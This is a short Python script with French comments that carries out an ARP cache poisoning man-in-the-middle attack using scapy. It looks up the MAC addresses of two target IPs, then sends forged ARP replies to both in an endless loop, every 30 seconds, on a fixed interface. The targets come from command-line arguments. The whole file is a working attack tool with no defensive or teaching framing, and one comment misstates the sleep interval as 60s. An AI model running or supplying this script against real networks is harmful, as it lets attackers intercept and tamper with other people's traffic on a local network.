#!/usr/bin/env python3
'''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
from scapy.all import ARP,Ether,sendp, srp
import time as t
import sys

def mac(ip:str)->str:
  '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
  ip: est une adresse IP
  '''
  paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) #Paquet ARP evoyer en broadcast 
  #paquet sert à récuprer une adresse MAC
  rep = srp(paquet, iface='enp0s3') #Reponse au ARP
  return rep[0][0][1].hwsrc #Renvoie l'adresse MAC

def arp(ipa:str, ipb:str)->None:
  '''ARP POISONING: \n
  Procedure permetant de realiser une attaque Man In The Middle par
  empoisonnement de cache ARP. \n
  ipa: Une des deux adresse IP que l'on veut empoisonner.
  ipb: L'autre adresse IP que l'on veut empoisonner.
  '''

  maclist = [mac(ip) for ip in [ipa, ipb]]

  #On cree deux paquets ARP qui associe l'adresse IP (a et b) a l'adresse MAC du PC
  paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb)
  paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa)
  while True: #Boucle infinie
    sendp(paquet1, iface='enp0s3')
    sendp(paquet2, iface='enp0s3')
    t.sleep(30) #Arrete le processus durant 60s

arp(sys.argv[1], sys.argv[2])
